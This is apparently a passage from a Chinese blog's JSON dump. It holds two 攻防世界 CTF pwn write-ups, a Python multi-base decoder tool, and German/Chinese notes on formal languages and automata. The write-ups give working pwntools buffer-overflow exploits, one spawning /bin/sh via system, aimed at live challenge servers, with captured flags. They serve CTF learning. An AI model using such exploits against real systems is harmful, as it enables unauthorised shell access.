接着查看vulnerable_function()的stack结构： 此外，main函数自己会调用system()： 现在来找call _system这个命令的地址： 在这个页面右键点击_system并选择Text view： 便可以确定这行命令在text（即代码）部分的地址： 10804849E 接着使用Shift+F12查看文件里的string： 由于system函数实际上接受的是一个字符串的指针，所以我们可以直接用在上面找到的/bin/sh的地址并将其作为参数传给system函数。 注意！这个程序是32bit的。 可以通过很多方面来判断： 程序中使用了eax, ecx, esp, ebp等寄存器。这些都是32位寄存器。 （如果是 64 位程序，寄存器通常会是：rax, rcx, rsp, rbp, 等。） 地址宽度是32bit的（最简单也是最重要的判断条件） 所以之后需要使用pwn库的p32()，而不是p64()。 Exploit我们做以下操作： 覆盖掉buf以及saved_registers部分（=136+4） 将vulnerable_function()的返回地址修改成call _system()的地址 将system()函数的参数改为/bin/sh的地址 便可以成功打开shell。 所以我们需要做的是发送这段内容： 123payload = b&quot;a&quot; * (136 + 4) # buf 以及 saved_registers 的部分payload += p32(0x0804849E) # call _system() 的地址payload += p32(0x0804A024) # /bin/sh 的地址 之后便是使用ls以及cat flag命令读取flag。 Exploit代码： 123456789101112131415161718192021222324252627282930from pwn import *r = remote(&quot;223.112.5.141&quot;, 50648)print(r.recvline())payload = b&quot;a&quot; * (136 + 4) # buf 以及 saved_registers 的部分payload += p32(0x0804849E) # call _system() 的地址payload += p32(0x0804A024) # /bin/sh 的地址r.sendline(payload)r.interactive()# [x] Opening connection to 223.112.5.141 on port 50648# [x] Opening connection to 223.112.5.141 on port 50648: Trying 223.112.5.141# [+] Opening connection to 223.112.5.141 on port 50648: Done# b&#x27;Input:\\n&#x27;# [*] Switching to interactive mode# ls# bin# dev# flag# level2# lib# lib32# lib64# cat flag# cyberpeace&#123;630b1c1c66bca13f722670008c4ec2af&#125;# [*] Interrupted# [*] Closed connection to 223.112.5.141 port 50648","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/en/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"攻防世界 hello_pwn Writeup","slug":"CTF/Pwn/攻防世界-hello-pwn-Writeup","date":"2025-05-12T08:00:16.000Z","updated":"2025-06-10T19:07:24.740Z","comments":true,"path":"2025/05/12/CTF/Pwn/攻防世界-hello-pwn-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello-pwn-Writeup/","excerpt":"利用Buffer Overflow来修改目标变量的值","text":"观察用ida打开文件查看main函数： 查看sub_400686()： 也就是说我们如果可以满足if的条件便可以得到flag。 查看unk_601068和dword_60106C的位置（直接点击这2个变量即可）： 可以发现他们的地址只差了4Byte。 Exploit我们需要做的是发送一段内容，结构如下： 1payload = b&quot;AAAA&quot; + p32(1853186401) 首先将它们中间差的4个Byte给填满，然后便可以将dword_60106C原本的内容覆盖成满足if要求的值，之后便可以直接得到flag。 Exploit代码： 1234567891011121314151617181920212223242526from pwn import *r = remote(&quot;61.147.171.105&quot;, 59747)res = r.recvline()print(res)res = r.recvline()print(res)payload = b&quot;AAAA&quot; + p32(1853186401)r.sendline(payload)res = r.recvall()print(res)# [x] Opening connection to 61.147.171.105 on port 59747# [x] Opening connection to 61.147.171.105 on port 59747: Trying 61.147.171.105# [+] Opening connection to 61.147.171.105 on port 59747: Done# b&#x27;~~ welcome to ctf ~~ \\n&#x27;# b&#x27;lets get helloworld for bof\\n&#x27;# [x] Receiving all data# [x] Receiving all data: 0B# [x] Receiving all data: 45B# [+] Receiving all data: Done (45B)# [*] Closed connection to 61.147.171.105 port 59747# b&#x27;cyberpeace&#123;7ffb977ba34907b01a6b6b74280a5921&#125;\\n&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/en/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"解码器","slug":"CTF/Crypto/解码器","date":"2025-05-11T18:50:59.000Z","updated":"2025-05-11T19:04:03.148Z","comments":true,"path":"2025/05/11/CTF/Crypto/解码器/","permalink":"https://archer-baiyi.github.io/en/2025/05/11/CTF/Crypto/%E8%A7%A3%E7%A0%81%E5%99%A8/","excerpt":"","text":"用Python写了一个自动解码的软件，可以自动进行多轮的base 32，58，64，91，二进制以及hex解码。 （后续可能会更新。） 效果 如果可以成功解码成text，则直接输出text： 如果不能，则输出hex作为保底： 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136import tkinter as tkfrom tkinter import scrolledtextimport base64import reimport base58import base91def is_binary(s): return all(c in &#x27;01&#x27; for c in s) and len(s) % 8 == 0def decode_bytes(byte_data): try: text = byte_data.decode(&#x27;utf-8&#x27;) return text, True except UnicodeDecodeError: return byte_data.hex(), Falsedef looks_like_base64(s): return len(s) % 4 == 0 and re.fullmatch(r&#x27;[A-Za-z0-9+/=]+&#x27;, s) is not Nonedef looks_like_base32(s): return len(s) % 8 == 0 and re.fullmatch(r&#x27;[A-Z2-7=]+&#x27;, s, re.IGNORECASE) is not Nonedef looks_like_base58(s): return all(c in base58.alphabet.decode() for c in s)def looks_like_base91(s): return all(33 &lt;= ord(c) &lt;= 126 for c in s)def try_decode(s, func): decoded = func(s) return decode_bytes(decoded)def recursive_decode(s, path=None, all_paths=None, max_depth=10): if path is None: path = [] if all_paths is None: all_paths = [] if len(path) &gt;= max_depth: return all_paths decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), (&#x27;Base91&#x27;, looks_like_base91, base91.decode), (&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i+8], 2) for i in range(0, len(x), 8))), (&#x27;Hex&#x27;, lambda x: True, lambda x: bytes.fromhex(x)), ] for name, detector, func in decoders: if detector(s): try: text, is_utf8 = try_decode(s, func) except Exception: continue mode = &#x27;(UTF-8)&#x27; if is_utf8 else &#x27;(hex)&#x27; new_path = path + [(name, text, mode)] all_paths.append(new_path) if is_utf8: recursive_decode(text, new_path, all_paths, max_depth) return all_pathsdef select_final_path(paths): utf_paths = [p for p in paths if p[-1][2] == &#x27;(UTF-8)&#x27;] if utf_paths: max_len = max(len(p) for p in utf_paths) for p in utf_paths: if len(p) == max_len: return p max_len = max(len(p) for p in paths) for p in paths: if len(p) == max_len: return pdef decode_input(): raw = input_text.get(&#x27;1.0&#x27;, tk.END).strip().replace(&#x27; &#x27;, &#x27;&#x27;) output_text.delete(&#x27;1.0&#x27;, tk.END) if not raw: return paths = recursive_decode(raw) if not paths: output_text.insert(tk.END, &#x27;无法识别或解码此内容。&#x27;) return final = select_final_path(paths) for i, (name, text, mode) in enumerate(final, 1): output_text.insert(tk.END, f&quot;第&#123;i&#125;步 - &#123;name&#125; &#123;mode&#125;\\n结果：&#123;text&#125;\\n\\n&quot;) # 如果只有一步且为 UTF-8，但结果仍可能是编码串，则额外尝试一次解码并输出 hex if len(final) == 1 and final[0][2] == &#x27;(UTF-8)&#x27;: s = final[0][1] extra_decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), (&#x27;Base91&#x27;, looks_like_base91, base91.decode), (&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i+8], 2) for i in range(0, len(x), 8))) ] for name, detector, func in extra_decoders: if detector(s): try: data = func(s) hex_out = data.hex() output_text.insert(tk.END, f&quot;第2步 - &#123;name&#125; (hex)\\n结果：&#123;hex_out&#125;\\n&quot;) break except Exception: continue# GUIroot = tk.Tk()root.title(&#x27;解码器&#x27;)root.geometry(&#x27;600x500&#x27;)font_title = (&#x27;微软雅黑&#x27;, 12, &#x27;bold&#x27;)font_text = (&#x27;微软雅黑&#x27;, 10)tk.Label(root, text=&#x27;请输入编码内容：&#x27;, font=font_title).pack(pady=(10,0))input_text = scrolledtext.ScrolledText(root, height=6, font=font_text, wrap=tk.WORD)input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)tk.Button(root, text=&#x27;开始解码&#x27;, font=font_title, bg=&#x27;#4CAF50&#x27;, fg=&#x27;white&#x27;, command=decode_input).pack(pady=10)tk.Label(root, text=&#x27;解码输出：&#x27;, font=font_title).pack()output_text = scrolledtext.ScrolledText(root, height=10, font=font_text, wrap=tk.WORD)output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)root.mainloop() 打包可以用pyinstaller将这个程序打包成.exe软件。 如果没有安装，则运行： 1pip install pyinstaller 安装好后运行（先将当前python脚本保存为decoder.py）： 1pyinstaller --noconfirm --windowed --onefile .\\decoder.py .exe文件应该会生成在当前目录下的： 1dist/decoder.exe 测试随机生成一段进行过多轮base编码的内容： 12345678910111213141516171819202122232425262728import base64import base58import randomtext = &quot;hello world&quot;data = text.encode(&#x27;utf-8&#x27;)encodings = [&#x27;base64&#x27;, &#x27;base32&#x27;, &#x27;base58&#x27;]history = []for i in range(10): encoding = random.choice(encodings) history.append(encoding) if encoding == &#x27;base64&#x27;: data = base64.b64encode(data) elif encoding == &#x27;base32&#x27;: data = base64.b32encode(data) elif encoding == &#x27;base58&#x27;: data = base58.b58encode(data)print(&quot;Final encoded result:&quot;, data.decode(&#x27;utf-8&#x27;))print(&quot;Encoding history:&quot;, history)# Final encoded result: VlRKek1WWldTbFphUmxwU1RWWktUVlJyVWt0U2JGRjRXa1ZXVm1FeVVsQlZha1pYVld4YVZsUnJUbFJoTUhCaFZtMXpkMlZzVWtkUmF6RlNWbTE0VmxWNlFYaFVSbHBYVVd0T1dGWnNXa1ZXTW5SUFUxWktObFpzYUZkV1YwNDJWbFJDVjFWRk5WZGhSVnBWVm14d1ZGWXhWWGhXTVZKV1YydG9WV0V3TlZaV1JFWmhVbFpLY2xac1pGWk5SRVpLVlcxd1MxTkdVbGRYYkZKVFZsUldVRlpGVmxOV1JsWnlWVmhzVldFelFsQlZiRkpUVjJ4VmVHSkZPVlZoTWxKSlZtcEdTMVV4Vm5KUFZtUlNUVVp3VTFZeFVrdFVRVDA5# Encoding history: [&#x27;base64&#x27;, &#x27;base64&#x27;, &#x27;base32&#x27;, &#x27;base58&#x27;, &#x27;base58&#x27;, &#x27;base32&#x27;, &#x27;base64&#x27;, &#x27;base64&#x27;, &#x27;base64&#x27;, &#x27;base64&#x27;] 程序的输出为： 123456789101112131415161718192021222324252627282930第1步 - Base64 (UTF-8)结果：VTJzMVZWSlZaRlpSTVZKTVRrUktSbFF4WkVWVmEyUlBVakZXVWxaVlRrTlRhMHBhVm1zd2VsUkdRazFSVm14VlV6QXhURlpXUWtOWFZsWkVWMnRPU1ZKNlZsaFdWV042VlRCV1VFNVdhRVpVVmxwVFYxVXhWMVJWV2toVWEwNVZWREZhUlZKclZsZFZNREZKVW1wS1NGUldXbFJTVlRWUFZFVlNWRlZyVVhsVWEzQlBVbFJTV2xVeGJFOVVhMlJJVmpGS1UxVnJPVmRSTUZwU1YxUktUQT09第2步 - Base64 (UTF-8)结果：U2s1VVJVZFZRMVJMTkRKRlQxZEVVa2RPUjFWUlZVTkNTa0paVmswelRGQk1RVmxVUzAxTFZWQkNXVlZEV2tOSVJ6VlhWVWN6VTBWUE5WaEZUVlpTV1UxV1RVWkhUa05VVDFaRVJrVldVMDFJUmpKSFRWWlRSVTVPVEVSVFVrUXlUa3BPUlRSWlUxbE9Ua2RIVjFKU1VrOVdRMFpSV1RKTA==第3步 - Base64 (UTF-8)结果：Sk5URUdVQ1RLNDJFT1dEUkdOR1VRVUNCSkJZVk0zTFBMQVlUS01LVVBCWVVDWkNIRzVXVUczU0VPNVhFTVZSWU1WTUZHTkNUT1ZERkVWU01IRjJHTVZTRU5OTERTUkQyTkpORTRZU1lOTkdHV1JSUk9WQ0ZRWTJL第4步 - Base64 (UTF-8)结果：JNTEGUCTK42EOWDRGNGUQUCBJBYVM3LPLAYTKMKUPBYUCZCHG5WUG3SEO5XEMVRYMVMFGNCTOVDFEVSMHF2GMVSENNLDSRD2NJNE4YSYNNGGWRRROVCFQY2K第5步 - Base32 (UTF-8)结果：KfCPSW4GXq3MHPAHqVmoX151TxqAdG7mCnDwnFV8eXS4SuFRVL9tfVDkV9DzjZNbXkLkF1uDXcJ第6步 - Base58 (UTF-8)结果：4npCTEQcUgxRUY2DRDCpq4jmaCGw8BXZ557XUXvaYf6cK63oEYV1SwW第7步 - Base58 (UTF-8)结果：LFKWIV3DGJFEQT2HMRVU22TMGVMWWZCSKBIT2PI=第8步 - Base32 (UTF-8)结果：YUdWc2JHOGdkMjl5YkdRPQ==第9步 - Base64 (UTF-8)结果：aGVsbG8gd29ybGQ=第10步 - Base64 (UTF-8)结果：hello world","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/tags/CTF/"},{"name":"decode","slug":"decode","permalink":"https://archer-baiyi.github.io/en/tags/decode/"},{"name":"解码","slug":"解码","permalink":"https://archer-baiyi.github.io/en/tags/%E8%A7%A3%E7%A0%81/"},{"name":"base 64","slug":"base-64","permalink":"https://archer-baiyi.github.io/en/tags/base-64/"}]},{"title":"Theoretische Informatik 理论信息学","slug":"TUM info 笔记/Theoretische Informatik/Theoretische-Informatik-理论信息学","date":"2025-04-27T21:56:41.000Z","updated":"2025-09-29T17:18:01.959Z","comments":true,"path":"2025/04/27/TUM info 笔记/Theoretische Informatik/Theoretische-Informatik-理论信息学/","permalink":"https://archer-baiyi.github.io/en/2025/04/27/TUM%20info%20%E7%AC%94%E8%AE%B0/Theoretische%20Informatik/Theoretische-Informatik-%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/","excerpt":"理论信息学相关笔记","text":"大纲/总结 2.Grundbegriffe 2.1 Grammatiken 2.2 Die Chomsky-Hierarchie： Typ 0 (Phrasenstruktur), 1 (Kontextsensitive), 2 (Kontextfreie), 3 (Rechtslinear, Regulär) 3.Reguläre Sprachen （Typ 3） 3.1 Deterministische endliche Automaten 3.2 Von rechtslinearen Grammatiken zu DFA (und zurück) 3.3 NFAs mit epsilon-Übergängen 3.4 Reguläre Ausdrücke 3.5 Von NFA zu RE als Lösung eines Gleichungssystems： 推导NFA对应的RE，以及从RE对应的NFA。 3.6 Rechnen mit regulären Ausdrücken： 一些等价的RE。 3.7 Abschlusseigenschaften regulärer Sprachen： regulärer Sprachen的交并集，补集，乘集等都是regulärer的。 3.8 Pumping Lemma： Reguläre Sprache的特殊性质，可以用于证明某个Sprache不是regulär的。 3.9 Entscheidungsverfahren： 以下几个问题的可解性以及复杂度：Wortproblem, Leerheitsproblem, Endlichkeitsproblem, Äquivalenzproblem。 3.10 Minimierung endlicher Automaten： 每个DFA都能（利用等价类）化简到minimal。 4.Kontextfreie Sprachen （Typ 2） 4.1 Kontextfreie Grammatiken Syntaxbaum，复习定义，新缩写：CFG （Kontextfreie Grammatik），CFL （Kontextfreie Sprache）。 4.2 Induktive Definitionen, Syntaxbäume und Ableitungen Wort的推导/生成都有一个对应的Syntaxbaum。 4.3 Die Chomsky-Normalform epsilon-Produktion，Kettenproduktion，（如何构造）Chomsky-Normalform，Greibach-Normalform。 4.4 Das Pumping-Lemma für kontextfreie Sprachen： 和之前的类似，适合用于证明某个Sprache不是kontextfrei的。 4.5 Abschlusseigenschaften： Vereinigung，Konkatenation，Stern，Spiegelung后的都还是kontextfrei，但是交集，补集不一定是了。 4.6 Algorithmen für kontextfreie Grammatiken 4.7 Der Cocke-Younger-Kasami-Algorithmus CYK算法，用于验证一个单词是否属于一个文法（Grammatik）。 4.8 Kellerautomaten Pushdown Automaton （PDA） 4.9 Äquivalenz von PDAs und CFGs 4.10 Deterministische Kellerautomaten 4.11 Tabellarischer Überblick 5. Berechenbarkeit, Entscheidbarkeit 5.1 Der Begriff der Berechenbarkeit Berechenbarkeit，Turingmaschine 5.2 Unentscheidbarkeit des Halteproblems 5.3 Semi-Entscheidbarkeit 5.4 Die Sätze von Rice und Shapiro 5.5 Das Postsche Korrespondenzproblem 5.6 Unentscheidbare CFG-Probleme 6. Komplexitätstheorie 6.1 Die Komplexitätsklasse P 6.2 Die Komplexitätsklasse NP 6.3 NP-Vollständigkeit 6.4 Weitere NP-vollständige Probleme 6.5 Die Unvollständigkeit der Arithmetik 6.6 Die Entscheidbarkeit der Presburger Arithmetik 需要掌握的算法： 第三章： Grammatik转NFA（Satz 3.9；H 3.1，T 2.2） NFA转DFA （Satz 3.10） Potenzmengenkonstruktion（H 3.2） DFA转Grammatik （Satz 3.13） epsilon-NFA转NFA（Lemma 3.16） NFA转regulär Ausdruck 画图（T 4.1） 高斯消元/解方程/Ardens Lemma（T 4.2，H 4.1） Regulär Ausdruck转epsilon-NFA（T 3.3，H 3.4） DFA Minimierung（Tabelle）（T 5.3 a)，H 5.3） 构造regulär Ausdruck对应的Minimalautomat 第四章： 构造CFG的Chomsky-Normalform（T 7.1，T 7.4，H 7.1） 消除Grammatik的unnützliche Symbole（T 8.1，H 8.1） CYK（CYK Tabelle，用于验证一个单词是否属于一个文法（Grammatik））（T 8.2 b)，T 8.5，H 8.2.） Grammatik转PDA（Satz 4.53，T 9.3） CFG转PDA PDA转CFG 不同Type的语言以及对应的自动机： Typ Automat Typ 3 (Deterministischer) Endliche Autoamt / deterministic finite automaton (FA) Typ 2 Kellerautomat / Pushdown Automaton (PDA) Typ 0 Turingmaschinen (TM) 基本概念Definition:一个字母表（Alphabet） $\\Sigma$ 是一个有限集合。例如：$ \\{0,1\\} $、ASCII、Unicode。一个单词/字符串 （Wort/String）是由$\\Sigma$中字符组成的有限序列，例如 010。$|w|$表示单词$ w $ 的长度。空单词（leere Wort）（长度为 0 的唯一单词）用$\\varepsilon$表示。如果 $u$ 和 $v$ 是单词，则 $uv$ 表示它们的连接（Konkatenation）。如果 $ w $ 是一个单词，那么 $w^n$ 定义为：$ w^0 = \\varepsilon $，并且 $ w^{n+1} = w w^n $。例如：$ (ab)^3 = ababab $。$ \\Sigma^* $ 是所有由 $ \\Sigma $ 中字符组成的单词的集合（Menge aller Wörter）。其中的子集$ L \\subseteq \\Sigma^* $ 被称为（形式）语言 （(formale) Sprache）。 注意，这里的形式语言（(formale) Sprache）$L$并没有要求必须包含$\\varepsilon$。 来看一下简单的（形式）语言 （(formale) Sprache）的例子： 杜登（Duden）词典中所有单词的集合 $L_1 = \\{ \\varepsilon, ab, abab, ababab, \\dots \\} = \\{ (ab)^n \\mid n \\in \\mathbb{N} \\}$ （$\\Sigma_1 = \\{a, b\\}$） $L_2 = \\{ \\varepsilon, ab, aabb, abab, abba, baab, baba, bbaa, \\dots \\} = \\{ w \\in \\{a,b\\}^* \\mid w\\ \\text{中包含相同数量的}\\ a\\ \\text{和}\\ b\\ \\text{字符} \\}$ （$\\Sigma_2 = \\{a, b\\}$） $L_3 = \\{0, 1, 100, 1001, 10000, \\dots\\} = \\{ w \\in \\{0,1\\}^* \\mid w\\ \\text{是一个二进制编码的平方数} \\}$ （$\\Sigma_3 = \\{0,1\\}$） $\\emptyset$ $\\{\\varepsilon\\}$ 反例： $\\varepsilon$ 或 $ab$ 不是语言，因为它们不是集合。 Definition: 语言上的运算（Operationen auf Sprachen）设 $A, B \\subseteq \\Sigma^*$：连接（Konkatenation）：$AB := \\{ uv \\mid u \\in A \\land v \\in B \\}$例子：$\\{ab, b\\} \\{a, bb\\} = \\{aba, abbb, ba, bbb\\}$A^n := \\{ w_1 \\dots w_n \\mid w_1, \\dots, w_n \\in A \\} = \\underbrace{A \\cdots A}_{n}例子：$\\{ab, ba\\}^2 = \\{abab, abba, baab, baba\\}$递归定义：$A^0 = \\{\\varepsilon\\} \\quad \\text{且} \\quad A^{n+1} := A A^n$A^* := \\{ w_1 \\dots w_n \\mid n \\geq 0 \\land w_1, \\dots, w_n \\in A \\} = \\bigcup_{n \\in \\mathbb{N}} A^n例子：\\{01\\}^* = \\{\\varepsilon, 01, 0101, 010101, \\dots\\} \\neq \\{0,1\\}^*A^+ := AA^* = \\bigcup_{n \\geq 1} A^n 注意，因为$A^0 = \\{ \\varepsilon \\}$，所以对于所有 $A$ 都有：$\\varepsilon \\in A^$，并且 $\\emptyset^ = \\{ \\varepsilon \\}$。 Lemma:$\\emptyset A = \\emptyset$$\\{\\varepsilon\\}A = A$ 证明：Trivial。$\\square$ Lemma:$A(B \\cup C) = AB \\cup AC$$(A \\cup B)C = AC \\cup BC$ 证明：Trivial。$\\square$ 但是注意，$A(B \\cap C) \\neq AB \\cap AC$不一定一直成立。 反例：$A=\\{a,ab\\}, B=\\{b\\}, C =\\{\\varepsilon\\}$： A(B\\cap C) = A \\emptyset = \\emptyset AB \\cap AC = \\{ab,abb\\} \\cap \\{a,ab\\} = \\{ab\\} \\neq \\emptyset最根本的原因是可能存在$u’v’= u’’v’’ \\in AB \\cap AC$并且$u’ \\neq u’’, v’ \\neq v’’$。这就导致不能从$uv \\in AB \\cap AC$推出存在$u \\in A, v \\in B \\cap C$。 Lemma:A^* A^* = A^* 证明：Trivial。$\\square$ 文法（Grammatiken）Definition:一个文法（Grammatik）是一个四元组 $G = (V, \\Sigma, P, S)$，其中：$V$ 是一组非终结符号（Nichtterminalzeichen / Nichtterminale / Variablen）的有限集合；$\\Sigma$ 是一组终结符号（Terminalzeichen / Terminale / Alphabet），与 $V$ 不相交；P \\subseteq (V \\cup \\Sigma)^* \\times (V \\cup \\Sigma)^*是一组产生式（Produktionen）的集合；$S \\in V$ 是开始符号（Startsymbol）。 为了方便，我们一般用： $\\alpha \\to \\beta$ 指代 $(\\alpha, \\beta) \\in P$； $\\alpha \\to \\beta_1|\\cdots |\\beta_n$ 指代 $\\alpha \\to \\beta_1, …, \\alpha \\to \\beta_n$ Definition:一个文法（Grammatik） $G = (V, \\Sigma, P, S)$ induziert 一个推导关系 $\\to_G$，作用于 $V \\cup \\Sigma$ 上的单词：\\alpha \\to_G \\alpha'当且仅当存在一条规则 $\\beta \\to \\beta’$ 属于 $P$，以及单词 $\\alpha_1, \\alpha_2$，使得\\alpha = \\alpha_1 \\beta \\alpha_2 \\quad \\text{且} \\quad \\alpha' = \\alpha_1 \\beta' \\alpha_2.一个这样的序列\\alpha_1 \\to_G \\alpha_2 \\to_G \\cdots \\to_G \\alpha_n叫做从 $\\alpha_1$ 开始的推导（Ableitung）。如果 $\\alpha_1 = S$ 并且\\alpha_n \\in \\Sigma^* ，那么 $G$ 生成（erzeugt）单词 $\\alpha_n$。$G$ 的语言（Sprache von G）是所有由 $G$ 生成的单词的集合，记为 $L(G)$。 注意，定义里的$\\alpha_1, \\alpha_2$可以是$\\varepsilon$，也可以是其他单词的Konkatenation。所以在一个大的Konkatenation里，对于其中一个存在Produktion，那么对整个Konkatenation都存在一个推导。 例子： $V = \\{ \\langle \\text{Expr} \\rangle, \\langle \\text{Term} \\rangle, \\langle \\text{Factor} \\rangle \\}$ $\\Sigma = \\{ a, b, c, +, *, (, ) \\}$ $S = \\langle \\text{Expr} \\rangle$ $P$： \\begin{align} \\langle \\text{Expr} \\rangle &\\to \\langle \\text{Term} \\rangle \\\\ \\langle \\text{Expr} \\rangle &\\to \\langle \\text{Expr} \\rangle + \\langle \\text{Term} \\rangle \\\\ \\langle \\text{Term} \\rangle &\\to \\langle \\text{Factor} \\rangle \\\\ \\langle \\text{Term} \\rangle &\\to \\langle \\text{Term} \\rangle * \\langle \\text{Factor} \\rangle \\\\ \\langle \\text{Factor} \\rangle &\\to a\\ \\mid\\ b\\ \\mid\\ c \\\\ \\langle \\text{Factor} \\rangle &\\to (\\langle \\text{Expr} \\rangle) \\end{align} 该如何从$\\langle \\text{Expr} \\rangle$推导出$a * (b + c)$呢？ \\begin{align*} \\langle \\text{Expr} \\rangle &\\xrightarrow{1} \\langle \\text{Term} \\rangle \\xrightarrow{4} \\langle \\text{Term} \\rangle * \\langle \\text{Factor} \\rangle \\xrightarrow{3} \\langle \\text{Factor} \\rangle * \\langle \\text{Factor} \\rangle \\\\ &\\xrightarrow{5} a * \\langle \\text{Factor} \\rangle \\xrightarrow{6} a * (\\langle \\text{Expr} \\rangle) \\xrightarrow{2} a * (\\langle \\text{Expr} \\rangle + \\langle \\text{Term} \\rangle) \\\\ &\\xrightarrow{1} a * (\\langle \\text{Term} \\rangle + \\langle \\text{Term} \\rangle) \\xrightarrow{3} a * (\\langle \\text{Factor} \\rangle + \\langle \\text{Term} \\rangle) \\xrightarrow{3} a * (\\langle \\text{Factor} \\rangle + \\langle \\text{Factor} \\rangle)\\\\ &\\xrightarrow{5} a * (b + \\langle \\text{Factor} \\rangle) \\xrightarrow{5} a * (b+ c) \\end{align*}一共需要11步。 例子： 这两个语法： \\begin{align*} G_1: \\quad S &\\to abcS \\mid \\epsilon \\\\ ba &\\to ab \\\\ cb &\\to bc \\\\ ca &\\to ac \\end{align*} \\begin{align*} G_1: \\quad S &\\to aBSc \\mid \\epsilon \\\\ Ba &\\to aB \\\\ Bb &\\to bB \\\\ Bc &\\to bc \\end{align*}哪个可以生成$M = \\{ a^n b^n c^n \\mid n \\geq 0 \\}$呢？ 首先，有$M \\subseteq L(G_1)$，因为$S \\to abcS \\to abcabcS \\to abcabc \\to abacbc \\to aabcbc \\to aabbcc$。 只不过$L(G_1) \\neq M$，因为$S \\to abcS \\to abcabcS \\to abcabc$。 而$L(G_2) = M$，因为： S \\to aBSc \\to aBaBcc \\to aBaBcc \\to aaBBcc \\to aaBbcc \\to aabBcc \\to aabbcc.Definition: (Reflexive transitive Hülle)\\begin{align*}\\alpha &\\to_G^0 \\alpha \\\\\\alpha &\\to_G^{n+1} \\gamma \\quad :\\Leftrightarrow \\quad \\exists \\beta.\\ \\alpha \\to_G^n \\beta \\to_G \\gamma \\\\\\alpha &\\to_G^* \\beta \\quad :\\Leftrightarrow \\quad \\exists n.\\ \\alpha \\to_G^n \\beta \\\\\\alpha &\\to_G^+ \\beta \\quad :\\Leftrightarrow \\quad \\exists n > 0.\\ \\alpha \\to_G^n \\beta\\end{align*} 不难注意到有： L(G) = \\{ w \\in \\Sigma^* | S \\to_G^* w \\}.例子：在前面的例子我们已经看到了$\\langle \\text{Expr} \\rangle$推导出$a * (b + c)$需要11步，所以有 \\langle \\text{Expr} \\rangle \\to_G^{11} a * (b + c)并因此有 \\langle \\text{Expr} \\rangle \\to_G^* a * (b + c)和 \\langle \\text{Expr} \\rangle \\to_G^+ a * (b + c)乔姆斯基体系（Chomsky Hierarchie）Definition:一个文法 $G$ 的类型定义如下：类型 0：始终成立。类型 1：如果对于每一个产生式 $\\alpha \\to \\beta$（除了 $S \\to \\varepsilon$）都有|\\alpha| \\leq |\\beta|并且，如果 $S \\to \\varepsilon$ 是一个产生式，则 $S$ 不出现在任何 $\\beta$ 中。类型 2：如果 $G$ 是类型 1 的文法，并且对于每个产生式 $\\alpha \\to \\beta$，都有\\alpha \\in V类型 3：如果 $G$ 是类型 2 的文法，并且对于每个产生式 $\\alpha \\to \\beta$（除了 $S \\to \\varepsilon$）都有\\beta \\in \\Sigma \\cup \\Sigma V 显然有： \\text{Typ 3} \\subseteq \\text{Typ 2} \\subseteq \\text{Typ 1} \\subseteq \\text{Typ 0}Theorem:L(\\text{Typ 3}) \\subseteq L(\\text{Typ 2}) \\subseteq L(\\text{Typ 1}) \\subseteq L(\\text{Typ 0}) Typ Grammatikart Sprachklasse Typ 3 Rechtslineare Grammatik Reguläre Sprachen Typ 2 Kontextfreie Grammatik Kontextfreie Sprachen Typ 1 Kontextsensitive Grammatik Kontextsensitive Sprachen Typ 0 Phrasenstrukturgrammatik Rekursiv aufzählbare Sprachen Wortproblem： Gegeben: 一个文法 $G$ 和一个单词 $w \\in \\Sigma^*$， Frage：$w$ 是否属于 $L(G)$？ 不同Type的语言以及对应的自动机： Typ Automat Typ 3 (Deterministischer) Endliche Autoamt / deterministic finite automaton (FA) Typ 2 Kellerautomat / Pushdown Automaton (PDA) Typ 0 Turingmaschinen (TM) 正规语言（Reguläre Sprachen）等价关系： Deterministische endliche AutomatenDefinition:Ein deterministischer endlicher Automat (deterministic finite automaton, DFA)$M = (Q, \\Sigma, \\delta, q_0, F)$ besteht auseiner endlichen Menge von Zuständen $Q$,einem (endlichen) Eingabealphabet $\\Sigma$,einer (totalen!) Übergangsfunktion $\\delta : Q \\times \\Sigma \\rightarrow Q$,einem Startzustand $q_0 \\in Q$, undeiner Menge $F \\subseteq Q$ von Endzuständen (akzeptierenden Zust.). 名字里的deterministisch是指：对于每一个状态（Zustand）以及一个Übergang只对应一个状态（Zustand）。 Definition:Die von $M$ akzeptierte Sprache istL(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},wobei 